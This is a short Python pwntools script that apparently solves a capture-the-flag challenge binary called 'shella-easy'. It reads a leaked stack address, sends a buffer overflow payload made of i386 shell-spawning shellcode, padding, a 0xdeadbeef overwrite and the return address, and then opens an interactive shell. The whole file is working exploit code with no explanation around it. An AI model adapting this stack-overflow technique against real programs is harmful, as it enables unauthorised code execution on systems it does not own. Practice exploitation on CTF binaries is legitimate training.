#!/usr/bin/python3
import pwn
binary = "shella-easy"
pwn.context.binary = binary
pwn.context.encoding = "latin"
pwn.context.log_level = "debug"

shellcode = pwn.asm(pwn.shellcraft.i386.linux.sh())

with pwn.process(binary) as io:
    io.recvuntil("Yeah I'll have a ")
    address = io.recvline()
    address = pwn.p32( int( address.decode().strip(" with a side of fries thanks\n"), 16 ) )
    payload = shellcode + b"A"*20 + pwn.p32(0xdeadbeef) + b"A"*8 + address
    io.send(payload)
    io.interactive()